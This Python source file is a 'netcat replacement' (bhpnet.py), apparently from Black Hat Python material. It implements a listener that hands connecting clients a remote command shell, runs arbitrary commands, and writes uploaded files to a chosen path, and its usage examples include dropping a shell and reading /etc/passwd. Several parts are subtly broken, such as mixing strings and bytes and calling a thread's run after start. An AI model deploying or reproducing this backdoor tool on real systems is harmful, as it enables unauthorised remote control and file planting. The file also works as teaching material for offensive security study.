import sys
import socket
import getopt
from threading import Thread
import subprocess

# define some global variables
LISTEN       = False
COMMAND_SHELL = False
UPLOAD       = False
EXECUTE      = ""
TARGET       = ""  # localhost
UPLOAD_DEST  = ""
PORT         = 0


def run_command(command):
    # run the command and get the output back
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = b"Failed to execute command.\r\n"

    # send the output back to the client
    return output


def client_handler(client_socket):
    global UPLOAD
    global EXECUTE
    global COMMAND_SHELL

    # check for upload
    if len(UPLOAD_DEST):
        # read in all of the bytes and write to our destination
        file_buffer = ""

        # keep reading data until none is available
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        # now we take these bytes and try to write them out
        with open(UPLOAD_DEST, "wb") as file_descriptor:
            file_descriptor.write(file_buffer)

            # acknowledge that we wrote the file out
            client_socket.send("Successfully saved file to {}\r\n".format(UPLOAD_DEST))

    # check for command execution
    if len(EXECUTE):
        # run the command
        output = run_command(EXECUTE)
        client_socket.send(output.decode('utf-8'))

    # now go into another loop if a command shell was requested
    if COMMAND_SHELL:
        while True:
            # show a simple prompt
            client_socket.send("<BHP:#> ".encode('utf-8'))

            # now we receive until we see a linefeed (ENTER key)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode("utf-8")

            # we have a valid command so execute it and send back the results
            response = run_command(cmd_buffer)

            # send back the response
            client_socket.send(response)


def server_loop():
    global TARGET
    global PORT

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Listen on all interfaces if no target is defined
        if not len(TARGET):
            print("Server listening on all interfaces")
            TARGET = ""

        server.bind((TARGET, PORT))
        server.listen(5)

        while True:
            print("Waiting for connection...")
            client_socket, addr = server.accept()

            print("Server starting @ {}".format(addr))
            # spin off a thread to handle our new client
            client_thread = Thread(target=client_handler, args=(client_socket,))
            client_thread.start()
            client_thread.run()
    except socket.error as err:
        print("{0} Server Exception! Exiting.".format(str(err)))
    except OSError as err:
        print("Server OS error: {0}".format(err))
    except Exception as inst:
        print(type(inst))
        print(inst)
    except:
        print("Unknown Server Exception! Exiting.")
    finally:
        # close the connection
        server.close()
        sys.exit(0)


# if we don't listen we are a client....make it so.
def client_sender():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # connect to our target host
        client.connect((TARGET, PORT))

        print("Client connected")

        while True:
            # wait for data received from the server
            recv_len = 1
            response = ""

            while recv_len:
                data     = client.recv(4096)
                recv_len = len(data)
                response += data.decode("utf-8")

                if recv_len < 4096:
                    break

            print(response)

            # wait for input from the user
            buffer = input()
            buffer += "\n"

            # send data to the server
            client.send(buffer.encode('utf-8'))
    except socket.error as err:
        print("{0} Client Exception! Exiting.".format(str(err)))
    except OSError as err:
        print("Client OS error: {0}".format(err))
    except Exception as inst:
        print(type(inst))
        print(inst)
    except:
        print("Unknown Client Exception! Exiting.")
    finally:
        # close the connection
        client.close()
        sys.exit(0)


def usage():
    """Prints the usage and options of the script then terminates the script"""
    print("")
    print("Netcat Replacement")
    print("")
    print("Usage: bhpnet.py -t target_host -p port")
    print("-l --listen              : listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run : execute the given file upon receiving a connection")
    print("-c --command             : initialize a command shell")
    print("-u --upload=destination  : upon receiving connection upload a file and write to [destination]")
    print("")
    print("Examples:")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
    print("")
    sys.exit(0)


def main():
    """
    Main function. Parses options passed to the script and determines if the script
    will run as a server or a client.
    """
    global LISTEN
    global PORT
    global EXECUTE
    global COMMAND_SHELL
    global UPLOAD_DEST
    global TARGET

    # Display the options and usage information if no command line options are passed.
    if not len(sys.argv[1:]):
        usage()

    # Read the command line options
    try:
        opts, args = getopt.getopt(sys.argv[1:],
                                   "hle:t:p:cu:",
                                   ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            LISTEN = True
        elif o in ("-e", "--execute"):
            EXECUTE = a
        elif o in ("-c", "--command"):
            COMMAND_SHELL = True
        elif o in ("-u", "--upload"):
            UPLOAD_DEST = a
        elif o in ("-t", "--target"):
            TARGET = a
        elif o in ("-p", "--port"):
            PORT = int(a)
        else:
            assert False, "Unhandled Option"

    # Determine if the script should be ran as a TCP server or client.
    if LISTEN:
        # we are going to listen and potentially upload things, execute commands, and drop a shell back
        # depending on the command line options above
        server_loop()
    elif len(TARGET) and PORT > 0:
        # we are going to be sending data to the server.
        # send data off
        client_sender()


if __name__ == '__main__':
    main()
